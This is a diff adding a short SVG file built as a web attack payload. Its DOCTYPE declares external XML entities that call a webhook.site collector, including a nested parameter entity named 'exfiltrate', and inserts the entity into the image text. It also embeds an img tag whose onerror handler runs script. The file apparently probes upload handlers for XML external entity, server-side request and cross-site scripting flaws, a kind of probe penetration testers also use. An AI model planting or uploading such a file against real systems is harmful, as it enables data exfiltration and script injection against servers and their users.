@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html [
+        <!ENTITY file SYSTEM "http://webhook.site/2ed1f38e-0336-4634-bec5-f778d5a3ef77/?x=test">
+        <!ENTITY eval "<!ENTITY &#x25; exfiltrate SYSTEM '<http://webhook.site/2ed1f38e-0336-4634-bec5-f778d5a3ef77/?x=test;>'>">
+        ]>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1"
+     width="120" height="120">
+    <rect x="14" y="23" width="200" height="50" fill="lime"
+        stroke="black" />
+    <text x="16" y="57">
+        &file;
+        <img src="http://webhook.site/2ed1f38e-0336-4634-bec5-f778d5a3ef77/?x=test" onerror="alert()"/>
+    </text>
+</svg>
